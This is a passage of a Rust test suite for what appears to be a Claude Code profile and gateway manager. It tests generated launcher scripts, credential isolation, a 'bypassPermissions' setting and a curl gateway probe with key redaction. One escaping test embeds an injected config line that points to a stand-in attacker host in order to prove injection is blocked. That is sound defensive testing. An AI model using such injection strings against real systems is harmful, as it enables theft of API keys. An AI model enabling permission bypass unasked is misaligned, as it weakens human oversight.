             echo CHILD_CFG=[%CLAUDE_CONFIG_DIR%]\r\n\
             exit /b %CLAUDE_FAKE_EXIT%\r\n",
        )
        .unwrap();

        // 用**真实生成器**产出脚本；只把 `$ccm` 换成一个不存在的路径，
        // 免得后台 _ccmSync 真的去启动本测试二进制。
        let mut corp = router_profile("corp");
        corp.token_enc = credentials::store("audit-corp", "audit-corp-token").unwrap();
        // 凭据自相矛盾（标了有 Key 却没有密文）：**尚未启动 Claude**
        // 就出错，也必须给出非零退出码，不然调用方读到的是上一次的残留值
        let mut bad = router_profile("badkey");
        bad.has_token = true;
        bad.token_enc = None;
        let mut script = generate_ps1(&[corp, account_profile("alt"), bad]);
        let swapped = script
            .lines()
            .map(|l| {
                if l.trim_start().starts_with("$ccm = ") {
                    "  $ccm = 'Z:\\ccm-does-not-exist\\no.exe'".to_string()
                } else {
                    l.to_string()
                }
            })
            .collect::<Vec<_>>()
            .join("\n");
        script = swapped;
        let script_path = dir.join("cc.ps1");
        fs::write(&script_path, &script).unwrap();

        // 调用者环境里放一组"上一环境残留"：受管理环境必须清掉，默认分支必须保留
        // 让子进程按 UTF-8 输出，否则脚本里的中文提示会被 OEM 编码写坏、断言读不到
        let probe = format!(
            "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8\n\
             Import-Module Microsoft.PowerShell.Security -ErrorAction Stop\n\
             $env:USERPROFILE = '{}'\n\
             $env:PATH = '{}\\;' + $env:PATH\n\
             $env:CLAUDE_FAKE_EXIT = '7'\n\
             $env:ANTHROPIC_BASE_URL = 'parent-url'\n\
             $env:ANTHROPIC_AUTH_TOKEN = 'parent-tok'\n\
             . '{}'\n\
             claude alt\n\
             Write-Output \"ALT_CODE=$LASTEXITCODE\"\n\
             Write-Output \"PARENT_URL_AFTER_ALT=[$env:ANTHROPIC_BASE_URL]\"\n\
             claude corp\n\
             Write-Output \"CORP_CODE=$LASTEXITCODE\"\n\
             $env:CLAUDE_FAKE_EXIT = '0'\n\
             claude corp\n\
             Write-Output \"CORP_OK_CODE=$LASTEXITCODE\"\n\
             claude just-a-default-arg\n\
             Write-Output \"PARENT_URL_AFTER_DEFAULT=[$env:ANTHROPIC_BASE_URL]\"\n\
             $env:CLAUDE_FAKE_EXIT = '0'\n\
             claude just-another-default-arg\n\
             claude badkey\n\
             Write-Output \"PRELAUNCH_CODE=$LASTEXITCODE\"\n",
            home.display(),
            bin.display(),
            script_path.display()
        );
        let out = ps_command()
            .args([
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                &probe,
            ])
            .output()
            .expect("PowerShell 未能启动");
        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
        let _ = fs::remove_dir_all(&dir);
        let line = |needle: &str| {
            stdout
                .lines()
                .find(|l| l.contains(needle))
                .unwrap_or("")
                .trim()
                .to_string()
        };

        // ① 退出码按原生进程回写：失败保留原值、成功为 0（不残留上一次）
        assert_eq!(
            line("ALT_CODE="),
            "ALT_CODE=7",
            "登录环境没回写退出码：{stdout}"
        );
        assert_eq!(
            line("CORP_CODE="),
            "CORP_CODE=7",
            "网关环境没回写退出码：{stdout}"
        );
        assert_eq!(
            line("CORP_OK_CODE="),
            "CORP_OK_CODE=0",
            "成功被报成失败、或残留了上一次的退出码：{stdout}"
        );
        // ② 封闭集合：**子进程**看不到调用者的网关变量（默认分支那次除外，见 ③）
        let child_lines: Vec<&str> = stdout
            .lines()
            .map(|l| l.trim())
            .filter(|l| l.starts_with("CHILD_"))
            .collect();
        // 5 次调用各 3 行：alt / corp(失败) / corp(成功) / 默认分支 ×2
        // （badkey 那次**还没启动 claude**，所以没有子进程输出）
        assert_eq!(child_lines.len(), 15, "子进程输出条数不对：{stdout}");
        // 「尚未启动 Claude」的错误也必须给出非零退出码：
        // badkey 没有可用密文，脚本会明确报错并置 1 —— 而不是把上一次的 0 留给调用方
        assert_eq!(
            line("PRELAUNCH_CODE="),
            "PRELAUNCH_CODE=1",
            "凭据缺失时没有给出非零退出码：{stdout}"
        );
        assert!(
            stdout.contains("没有可用的网关 Key"),
            "凭据缺失时没有明确报错：{stdout}"
        );
        let chunks: Vec<&[&str]> = child_lines.chunks(3).collect();
        // alt（独立登录环境）：只该有配置目录，网关地址与 Token 都必须为空
        assert_eq!(
            chunks[0][0], "CHILD_URL=[]",
            "登录环境继承了调用者的网关地址：{stdout}"
        );
        assert!(
            chunks[0][2].contains(".claude-split\\alt\\.claude"),
            "{stdout}"
        );
        // corp（网关环境）：用自己的地址；**调用者的 Token 不能被带进去**
        for (i, chunk) in chunks[1..3].iter().enumerate() {
            assert_eq!(
                chunk[0], "CHILD_URL=[https://gw.example.com/anthropic]",
                "第 {i} 次网关启动的地址不对：{stdout}"
            );
            assert!(
                chunk[2].contains(".claude-split\\corp\\.claude"),
                "{stdout}"
            );
        }
        // **第 2 条的核心断言**：调用者带着 parent-tok，受管理环境一个都拿不到它
        for (i, chunk) in chunks[0..3].iter().enumerate() {
            assert_eq!(
                chunk[1],
                if i == 0 {
                    "CHILD_TOK=[]"
                } else {
                    "CHILD_TOK=[audit-corp-token]"
                },
                "第 {i} 次受管理启动把调用者的凭证带进去了：{stdout}"
            );
        }
        // ③ 默认分支零干预：调用者的值原样保留（子进程也看得见），且不动配置目录
        assert!(
            chunks[3][0].contains("parent-url"),
            "默认分支干预了调用者的环境：{stdout}"
        );
        assert_eq!(
            line("PARENT_URL_AFTER_DEFAULT="),
            "PARENT_URL_AFTER_DEFAULT=[parent-url]",
            "默认分支改动了调用方的环境：{stdout}"
        );
        // ④ 受管理环境结束后，调用方环境被还原（不是被清掉）
        assert_eq!(
            line("PARENT_URL_AFTER_ALT="),
            "PARENT_URL_AFTER_ALT=[parent-url]",
            "调用方环境没被还原：{stdout}"
        );
    }

    // PowerShell 的 `switch` **默认大小写不敏感**（bash 的 `case` 敏感）。
    // 所以名为 `MCP` 的环境在 Windows 上同样会劫持 `claude mcp` ——
    // 这正是 `can_have_terminal_entry` 必须按大小写不敏感判断的原因。
    // 只能在本机有 PowerShell 时验证；macOS 上该行为不适用（且排除得更保守，无害）。
    #[cfg(target_os = "windows")]
    #[test]
    fn powershell_switch_is_case_insensitive_which_is_why_mcp_must_be_excluded() {
        let probe = "switch ('mcp') { 'MCP' { 'MATCHED' } default { 'DEFAULT' } }";
        let out = ps_command()
            .args(["-NoProfile", "-Command", probe])
            .output()
            .expect("PowerShell 未能启动");
        assert_eq!(
            String::from_utf8_lossy(&out.stdout).trim(),
            "MATCHED",
            "PowerShell switch 变成大小写敏感了：需要重新评估 can_have_terminal_entry 的判据"
        );
    }

    // 回归：把 if 语句的值赋给变量时，PowerShell 会把单元素数组拆包成标量字符串，
    // 而 splat 字符串是按字符展开的，于是 `claude corp --dangerously-skip-permissions`
    // 这种“只跟一个参数”的调用会碎成 31 个单字符参数传给 CLI。
    // @() 必须包住整个 if——写成 if (...) { @(...) } 修不好，拆包发生在赋值这步。
    #[test]
    fn generate_ps1_forwards_single_trailing_argument_as_array() {
        let script = generate_ps1(&[router_profile("corp")]);
        assert!(
            script.contains("$rest = @(if ($args.Count -gt 1)"),
            "@() 必须包住整个 if 语句，否则单个参数会被按字符拆散"
        );
    }

    // 回归：param([ValueFromRemainingArguments]) 会让绑定器把 -p、-c 这类
    // 单横线短参数当参数名截走并静默丢弃，必须用普通函数的 $args。
    #[test]
    fn generate_ps1_uses_args_so_short_flags_survive() {
        let script = generate_ps1(&[router_profile("corp")]);
        assert!(!script.contains("ValueFromRemainingArguments"));
        assert!(script.contains("$sub = if ($args.Count -ge 1)"));
        assert!(script.contains("& $exe @args"));
    }

    // 光比对字符串挡不住这个 bug：曾经把 @() 写在 if 分支内部，断言能过、行为照错。
    // 所以直接把生成器产出的那一行丢进真 PowerShell 跑，断言 splat 后的参数个数。
    #[cfg(target_os = "windows")]
    #[test]
    fn generated_ps1_rest_line_survives_single_argument_splat() {
        let script = generate_ps1(&[router_profile("corp")]);
        let rest_line = script
            .lines()
            .find(|l| l.trim_start().starts_with("$rest ="))
            .expect("生成的脚本里找不到 $rest 赋值行")
            .trim()
            .to_string();
        // 外层函数复刻生成脚本的取参方式，内层只负责数 splat 之后到手几个参数
        let probe = format!(
            "function outer {{ {rest_line}; function inner {{ $args.Count }}; inner @rest }}; \
             outer corp --dangerously-skip-permissions; outer corp -p hi"
        );
        let out = ps_command()
            .args(["-NoProfile", "-Command", &probe])
            .output()
            .expect("PowerShell 未能启动");
        let counts: Vec<String> = String::from_utf8_lossy(&out.stdout)
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect();
        // 1 个长参数不该被按字符拆散；-p hi 两个短参数不该被绑定器吞掉
        assert_eq!(
            counts,
            vec!["1".to_string(), "2".to_string()],
            "参数透传异常：实际拿到 {counts:?}"
        );
    }

    #[test]
    fn generate_sh_forwards_all_trailing_arguments() {
        let script = generate_sh(&[router_profile("corp")]);
        // shift 掉环境名后必须整体透传 "$@"，不能用 $* 或 $1
        assert!(script.contains("shift;"));
        assert!(script.contains("command claude \"$@\""));
    }

    #[test]
    fn apply_bypass_adds_default_mode_and_keeps_other_keys() {
        let mut v = serde_json::json!({
            "model": "opus",
            "permissions": { "allow": ["Bash(git add *)"] }
        });
        apply_bypass(&mut v, true).unwrap();
        assert_eq!(v["permissions"]["defaultMode"], "bypassPermissions");
        assert_eq!(v["permissions"]["allow"][0], "Bash(git add *)");
        assert_eq!(v["model"], "opus");
    }

    #[test]
    fn apply_bypass_creates_permissions_when_absent() {
        let mut v = serde_json::json!({});
        apply_bypass(&mut v, true).unwrap();
        assert_eq!(v["permissions"]["defaultMode"], "bypassPermissions");
    }

    #[test]
    fn apply_bypass_off_removes_only_default_mode() {
        let mut v = serde_json::json!({
            "permissions": { "defaultMode": "bypassPermissions", "allow": ["Bash(ls)"] }
        });
        apply_bypass(&mut v, false).unwrap();
        assert!(v["permissions"].get("defaultMode").is_none());
        assert_eq!(v["permissions"]["allow"][0], "Bash(ls)");
    }

    // 关闭后 permissions 变空壳就整个删掉，不给文件留垃圾
    #[test]
    fn apply_bypass_off_drops_emptied_permissions_object() {
        let mut v = serde_json::json!({
            "theme": "dark",
            "permissions": { "defaultMode": "bypassPermissions" }
        });
        apply_bypass(&mut v, false).unwrap();
        assert!(v.get("permissions").is_none());
        assert_eq!(v["theme"], "dark");
    }

    #[test]
    fn apply_bypass_off_is_noop_without_permissions() {
        let mut v = serde_json::json!({ "theme": "dark" });
        apply_bypass(&mut v, false).unwrap();
        assert_eq!(v, serde_json::json!({ "theme": "dark" }));
    }

    #[test]
    fn apply_bypass_rejects_non_object_root() {
        let mut v = serde_json::json!([1, 2]);
        assert!(apply_bypass(&mut v, true).is_err());
    }

    // ---------------- 网关探测：TLS 信任分级 ----------------

    #[test]
    fn curl_config_never_disables_verification() {
        // 回归护栏：任何模式、任何后端都不许再出现 insecure(等价 -k)。
        // 带上它等于把 Authorization 头交给 on-path 中间人。
        let bundle = Path::new("C:\\Users\\u\\.cc-manager\\ca-cert.pem");
        for backend in [TlsBackend::Schannel, TlsBackend::Other] {
            for (mode, b) in [
                (TrustMode::System, None),
                (TrustMode::ImportedCa, Some(bundle)),
            ] {
                let cfg = build_curl_config(
                    "https://gw.example.com/v1/models",
                    "sk-abc",
                    mode,
                    b,
                    backend,
                );
                assert!(
                    !cfg.contains("insecure"),
                    "{backend:?}/{mode:?} 配置里出现了 insecure：{cfg}"
                );
            }
        }
    }

    #[test]
    fn curl_config_pins_bundle_only_in_fallback_mode() {
        let bundle = Path::new("/tmp/ca-cert.pem");
        let sys = build_curl_config(
            "https://gw.example.com/v1/models",
            "sk-abc",
            TrustMode::System,
            Some(bundle),
            TlsBackend::Other,
        );
        // 系统信任模式带上 cacert 会替换掉系统信任库，把公有 CA 网关打挂
        assert!(!sys.contains("cacert"), "系统信任模式不该带 cacert：{sys}");

        let fallback = build_curl_config(
            "https://gw.example.com/v1/models",
            "sk-abc",
            TrustMode::ImportedCa,
            Some(bundle),
            TlsBackend::Other,
        );
        assert!(
            fallback.contains("cacert = \"/tmp/ca-cert.pem\""),
            "{fallback}"
        );

        // 回退模式但没给 bundle：也不能凭空造一个 cacert 出来
        let no_bundle = build_curl_config(
            "https://gw.example.com/v1/models",
            "sk-abc",
            TrustMode::ImportedCa,
            None,
            TlsBackend::Other,
        );
        assert!(!no_bundle.contains("cacert"), "{no_bundle}");
    }

    #[test]
    fn parse_tls_backend_detects_schannel() {
        // 本机实测的两种真实首行
        assert_eq!(
            parse_tls_backend(
                "curl 8.21.0 (x86_64-w64-mingw32) libcurl/8.21.0 Schannel zlib/1.3.2"
            ),
            TlsBackend::Schannel
        );
        assert_eq!(
            parse_tls_backend(
                "curl 8.7.1 (x86_64-apple-darwin24.0) libcurl/8.7.1 (SecureTransport) LibreSSL/3.3.6"
            ),
            TlsBackend::Other
        );
        assert_eq!(parse_tls_backend(""), TlsBackend::Other);
    }

    #[test]
    fn curl_config_adds_revoke_best_effort_only_on_schannel() {
        // Schannel 强制查吊销，自签网关没有 CRL 分发点会 rc=60「revocation status is
        // unknown」(已实测)；claude(OpenSSL)不查，所以要放行以便探测忠实于 claude。
        // 但该标志是 Schannel 专有，其它后端带上会被当未知选项，故必须按后端区分。
        let schannel = build_curl_config(
            "https://gw.example.com/v1/models",
            "sk-abc",
            TrustMode::System,
            None,
            TlsBackend::Schannel,
        );
        assert!(schannel.contains("ssl-revoke-best-effort"), "{schannel}");
        // 用的是 best-effort 而非彻底关掉吊销检查——证书确实被吊销时仍会失败
        assert!(!schannel.contains("ssl-no-revoke"), "{schannel}");

        let other = build_curl_config(
            "https://gw.example.com/v1/models",
            "sk-abc",
            TrustMode::System,
            None,
            TlsBackend::Other,
        );
        assert!(!other.contains("ssl-revoke"), "{other}");
    }

    #[test]
    fn curl_path_normalizes_windows_backslashes() {
        // curl 的配置文件把 `\` 当转义符(`\t` 会变成制表符)，Windows 路径原样写入会被
        // 静默破坏；正斜杠化让两个平台走同一条代码路径。
        assert_eq!(
            curl_path(Path::new("C:\\Users\\u\\.cc-manager\\ca-cert.pem")),
            "C:/Users/u/.cc-manager/ca-cert.pem"
        );
        // 已经是 Unix 路径的保持原样
        assert_eq!(
            curl_path(Path::new("/Users/u/.cc-manager/ca-cert.pem")),
            "/Users/u/.cc-manager/ca-cert.pem"
        );
    }

    #[test]
    fn curl_escape_strips_control_chars_and_escapes_quotes() {
        assert_eq!(curl_escape("a\\b\"c"), "a\\\\b\\\"c");
        assert_eq!(curl_escape("a\nb"), "ab");

        // 配置文件按行解析：注入换行等于注入任意 curl 指令
        let evil = "sk-abc\nurl = \"http://attacker/steal\"";
        let cfg = build_curl_config(
            "https://gw.example.com/v1/models",
            evil,
            TrustMode::System,
            None,
            TlsBackend::Schannel,
        );
        let url_lines = cfg.lines().filter(|l| l.starts_with("url =")).count();
        assert_eq!(url_lines, 1, "注入的换行造出了额外的 url 行：{cfg}");
    }

    #[test]
    fn classify_curl_failure_matches_libcurl_codes() {
        for code in [35, 51, 58, 59, 60, 64, 66, 77, 80, 82, 83, 90, 91, 98] {
            assert_eq!(
                classify_curl_failure(code),
                CurlFailure::Tls,
                "退出码 {code} 应判为 Tls"
            );
        }
        for code in [5, 6, 7, 28] {
            assert_eq!(
                classify_curl_failure(code),
                CurlFailure::Network,
                "退出码 {code} 应判为 Network"
            );
        }
        // 0 是成功，22 是 HTTP 层错误，都不该被误判成证书问题
        assert_eq!(classify_curl_failure(0), CurlFailure::Other);
        assert_eq!(classify_curl_failure(22), CurlFailure::Other);
    }

    #[test]
    fn ladder_escalates_only_on_tls_failure_with_bundle() {
        // 实测自签网关(证书校验不过)返回 rc=60，只有它值得带上已导入的 CA 再试一次
        assert_eq!(classify_curl_failure(60), CurlFailure::Tls);
        assert_eq!(
            next_probe_after_failure(classify_curl_failure(60), true),
            Some(TrustMode::ImportedCa)
        );
        // 没导入 CA 就无处回退——这正是"提示用户去导入"的场景
        assert_eq!(
            next_probe_after_failure(classify_curl_failure(60), false),
            None
        );
        // 网络不通/超时，换信任库也没用
        assert_eq!(
            next_probe_after_failure(classify_curl_failure(7), true),
            None
        );
        assert_eq!(
            next_probe_after_failure(classify_curl_failure(28), true),
            None
        );
        // 成功不触发回退
        assert_eq!(
            next_probe_after_failure(classify_curl_failure(0), true),
            None
        );
    }

    #[test]
    fn probe_verdict_only_accepts_2xx() {
        // 核心不变量 1：非零退出码一律失败，绝不可能是成功
        assert_eq!(
            probe_verdict(60, 0),
            ProbeVerdict::Curl(CurlFailure::Tls, 60)
        );
        assert_eq!(
            probe_verdict(7, 0),
            ProbeVerdict::Curl(CurlFailure::Network, 7)
        );
        assert_eq!(
            probe_verdict(-1, 0),
            ProbeVerdict::Curl(CurlFailure::Other, -1)
        );

        // 核心不变量 2：只有 2xx 才算成功。curl 不带 --fail 时错误状态也是退出码 0，
        // 只特判 401/403 会让一个带模型列表形状 body 的 502 被当成"健康"。
        assert_eq!(probe_verdict(0, 401), ProbeVerdict::Unauthorized(401));
        assert_eq!(probe_verdict(0, 403), ProbeVerdict::Unauthorized(403));
        for status in [500, 502, 503, 301, 302, 400, 404, 429] {
            assert_eq!(
                probe_verdict(0, status),
                ProbeVerdict::BadStatus(status),
                "HTTP {status} 不该被判成成功"
            );
        }
        // 状态码取不到（write-out 标记缺失）同样不算成功
        assert_eq!(probe_verdict(0, 0), ProbeVerdict::BadStatus(0));

        assert_eq!(probe_verdict(0, 200), ProbeVerdict::ParseModels);
        assert_eq!(probe_verdict(0, 204), ProbeVerdict::ParseModels);
    }

    #[test]
    fn redact_secret_removes_key_from_echoed_text() {
        // 网关（或前置代理）在错误页里回显请求头并不罕见，
        // 而诊断报告是要发给别人的——Key 不能进报告。
        let key = "sk-live-SUPER-SECRET-1234567890";
        let body = format!("{{\"error\":\"bad bearer {key}\",\"hint\":\"use {key}\"}}");
        let out = redact_secret(&body, key);
        assert!(!out.contains(key), "Key 没被抹掉：{out}");
        assert!(out.contains("<API Key 已隐去>"), "{out}");

        // 带前后空白的 token 也不能漏（配置里写的是 trim 后的值）
        let padded = format!("Bearer   {key}   ");
        assert!(!redact_secret(&padded, &format!("  {key}  ")).contains(key));

        // 空 token 不 panic，也不乱改文本
        assert_eq!(redact_secret("abc", ""), "abc");
        assert_eq!(redact_secret("abc", "   "), "abc");
    }

    #[test]
    fn clip_body_strips_control_chars_and_truncates() {
        // 响应体来自网关，可能带终端转义；剔除后再展示/落盘
        let clipped = clip_body("a\u{1b}[31mred\u{7}b\nc");
        assert!(!clipped.contains('\u{1b}'), "{clipped:?}");
        assert!(!clipped.contains('\u{7}'), "{clipped:?}");
        assert!(clipped.contains('\n'), "换行应保留：{clipped:?}");

        assert_eq!(clip_body(&"x".repeat(500)).chars().count(), 160);
    }

    #[test]
    fn only_chain_errors_suggest_importing_a_ca() {
        // 信任链类：导入 CA 确实是对策
        for code in [51, 60, 77, 83] {
            assert!(
                is_ca_import_likely_helpful(code),
                "退出码 {code} 应建议导入 CA"
            );
        }
        // 其余 TLS 码另有原因（客户端证书、密码套件、固定公钥…），
        // 同一句"请导入 CA"会误导用户白折腾
        for code in [35, 58, 59, 64, 66, 80, 82, 90, 91, 98] {
            assert!(
                !is_ca_import_likely_helpful(code),
                "退出码 {code} 不该断言是证书链问题"
            );
        }
    }

    #[test]
    fn curl_command_carries_no_hidden_flags() {
        // 回归护栏：build_curl_config 之外，curl 的选项还可能从命令行参数偷偷进来。
        // 这里钉死"命令本身不带任何参数"——-K 是 run_curl_probe 按需加的。
        let cmd = curl_command();
        let args: Vec<_> = cmd.get_args().collect();
        assert!(args.is_empty(), "curl_command 不该预设参数：{args:?}");
    }

    fn probe_out(stdout: &str, stderr: &str, exit_code: i32) -> ProbeOutput {
        ProbeOutput {
            stdout: stdout.into(),
            stderr: stderr.into(),
            exit_code,
        }
    }

    #[test]
    fn run_curl_probe_process_plumbing_works() {
        // 真跑一次 curl 进程（spawn → 经 stdin 写配置 → 关管道送 EOF → wait），
        // 目标是必然拒连的端口，所以会立刻失败。验证两件事：
        //   1) 不挂死、配置确实经 stdin 送达并被解析
        //   2) 失败不是"配置语法错误"——那会以 exit 2 + "config file option" 表达，
        //      说明写完没关管道或转义坏了
        let out = run_curl_probe(
            "http://127.0.0.1:1/v1/models",
            "sk-test",
            TrustMode::System,
            None,
        )
        .expect("不该是 spawn 层失败（curl 应当可用）");
        assert_ne!(out.exit_code, 0, "连不上的端口却报成功：{out:?}");
        assert!(
            !out.stderr.contains("config file option"),
            "配置没被正确解析：{}",
            out.stderr
        );
        // 顺带确认脱敏出口不依赖调用方：interpret_probe 是唯一关卡
        assert!(!interpret_probe(out, "sk-test")
            .unwrap_err()
            .message()
            .contains("sk-test"));
    }

    #[test]
    fn interpret_probe_accepts_real_curl_output_shape() {
        // 形状取自本机实测：响应体 + 换行 + write-out 标记
        let out = probe_out(
            "{\"data\":[{\"id\":\"glm-5.2\"},{\"id\":\"claude-sonnet-4-6\"}]}\n__CCM_HTTP__200",
            "",
            0,
        );
        assert_eq!(
            interpret_probe(out, "sk-abc").unwrap(),
            vec!["glm-5.2", "claude-sonnet-4-6"]
        );
    }

    #[test]
    fn interpret_probe_rejects_error_status_with_model_shaped_body() {
        // 这是本次审查抓到的假阳性：curl 不带 --fail 时 502 也是退出码 0，
        // 若只特判 401/403，这个 body 会让网关被报成"健康"。
        let out = probe_out("{\"data\":[{\"id\":\"x\"}]}\n__CCM_HTTP__502", "", 0);
        match interpret_probe(out, "sk-abc") {
            Err(ProbeError::BadResponse { http_code, .. }) => assert_eq!(http_code, 502),
            other => panic!("502 带模型形状 body 必须判失败，实际：{other:?}"),
        }

        // 标记缺失（状态码取不到）同样不能算成功
        let out = probe_out("{\"data\":[{\"id\":\"x\"}]}", "", 0);
        assert!(matches!(
            interpret_probe(out, "sk-abc"),
            Err(ProbeError::BadResponse { http_code: 0, .. })
        ));
    }

    #[test]
    fn interpret_probe_never_lets_the_key_reach_the_message() {
        // body 与 stderr 都由网关/curl 控制，Key 绝不能经它们进到用户可见文案
        // （健康详情会原样写进导出给别人看的诊断报告）。
        let key = "sk-live-SECRET-0001";

        // ① HTTP 500，错误页回显了 Key
        let bad_body = interpret_probe(
            probe_out(
                &format!("{{\"error\":\"bad bearer {key}\"}}\n__CCM_HTTP__500"),
                "",
                0,
            ),
            key,
        )
        .unwrap_err();
        // ② curl 自己的 stderr 里带 Key（配置被拒时 curl 会回显出问题的配置片段）
        let bad_stderr = interpret_probe(
            probe_out("", &format!("curl: (60) Bearer {key} rejected"), -1),
            key,
        )
        .unwrap_err();
        // ③ 网络类失败的 stderr 里带 Key
        let net_stderr = interpret_probe(
            probe_out("", &format!("curl: (7) proxy for Bearer {key} down"), 7),
            key,
        )
        .unwrap_err();

        for e in [bad_body, bad_stderr, net_stderr] {
            let msg = e.message();
            assert!(!msg.contains(key), "Key 泄进了文案：{msg}");
        }
    }

    #[test]
    fn parse_http_code_splits_status_from_body() {
        let (body, code) = parse_http_code("{\"data\":[]}\n__CCM_HTTP__200");
        assert_eq!(code, 200);
        assert_eq!(body, "{\"data\":[]}");

        // 响应体自身含标记时，最后一个是 write-out 写的真实状态码
        let (body, code) = parse_http_code("{\"note\":\"__CCM_HTTP__999\"}\n__CCM_HTTP__401");
        assert_eq!(code, 401);
        assert_eq!(body, "{\"note\":\"__CCM_HTTP__999\"}");

        // 没有标记(进程被杀 / 配置被拒)时状态码记 0，不能误报成 200
        let (body, code) = parse_http_code("oops");
        assert_eq!(code, 0);
        assert_eq!(body, "oops");
    }

    #[test]
    fn probe_error_messages_never_claim_reachable_without_verification() {
        // 本次修改的核心不变量：证书没验过时，文案里不许出现任何"已经通了"的断言。
        // 注意不能用 `contains("可达")` 做判据——"网络不可达"含这个子串却恰恰是
        // 诚实的相反结论，所以钉的是成功路径专有的措辞。
        fn assert_no_success_claim(msg: &str) {
            assert!(!msg.contains("可达，"), "失败文案复用了成功句式：{msg}");
            assert!(!msg.contains("Key 有效"), "失败文案宣称 Key 有效：{msg}");
            assert!(!msg.contains("个可用模型"), "失败文案宣称有可用模型：{msg}");
        }

        let tls = ProbeError::Curl {
            kind: CurlFailure::Tls,
            exit_code: 60,
            stderr: "schannel: certificate verify failed".into(),
        };
        let msg = tls.message();
        assert!(msg.contains("证书"), "{msg}");
        assert!(msg.contains("CA 证书"), "证书失败应指引去导入 CA：{msg}");
        assert_no_success_claim(&msg);

        let net = ProbeError::Curl {
            kind: CurlFailure::Network,
            exit_code: 7,
            stderr: "Failed to connect".into(),
        };
        assert_no_success_claim(&net.message());

        let other = ProbeError::Curl {
            kind: CurlFailure::Other,
            exit_code: 22,
            stderr: String::new(),
        };
        assert_no_success_claim(&other.message());

        assert_no_success_claim(&ProbeError::Auth { http_code: 401 }.message());
        assert_no_success_claim(&ProbeError::MissingToken.message());
        assert_no_success_claim(&ProbeError::InvalidUrl.message());
        assert_no_success_claim(&ProbeError::PlaintextTransport.message());
        assert_no_success_claim(
            &ProbeError::BadResponse {
                http_code: 500,
                body: "<html>".into(),
            }
            .message(),
        );
        assert_no_success_claim(&ProbeError::Spawn("no curl".into()).message());
    }
}
